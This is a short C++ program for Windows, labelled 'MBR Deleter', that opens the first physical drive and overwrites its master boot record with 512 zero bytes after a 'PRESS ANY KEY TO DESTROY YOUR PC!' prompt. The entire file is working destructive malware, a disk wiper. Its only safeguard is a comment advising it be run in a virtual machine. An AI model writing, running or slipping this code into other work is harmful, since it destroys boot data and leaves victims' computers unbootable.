#include <iostream>
#include <memory>
#include <Windows.h>

///MBR Deleter
///RUN IN A VIRTUAL MACHINE

#define MBR_SIZE 512

int main()
{
	std::cout << "PRESS ANY KEY TO DESTROY YOUR PC!\n";
	system("PAUSE");

	DWORD count;
	char mbrPayload[MBR_SIZE];
	ZeroMemory(mbrPayload, MBR_SIZE);

	void* PhysicalMasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	
	if (WriteFile(PhysicalMasterBootRecord, mbrPayload, MBR_SIZE, &count, NULL))
		std::cout << "MBR OVERWRITTEN!\n";
	else
		std::cout << "FAIL!\n";

	CloseHandle(PhysicalMasterBootRecord);

	system("PAUSE");
	return EXIT_SUCCESS;
	
}